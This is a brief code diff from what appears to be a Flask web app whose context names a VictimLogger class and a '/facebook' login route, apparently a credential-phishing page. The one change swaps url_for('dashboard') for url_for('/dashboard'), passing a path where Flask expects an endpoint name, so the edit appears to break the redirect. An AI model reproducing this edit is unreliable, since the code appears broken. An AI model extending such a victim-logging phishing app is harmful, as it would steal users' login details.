@@ -163,7 +163,7 @@ class VictimLogger:
 
 @app.route('/')
 def index():
-    return redirect(url_for('dashboard'))
+    return redirect(url_for('/dashboard'))
 
 @app.route('/facebook', methods=['GET', 'POST'])
 def facebook():
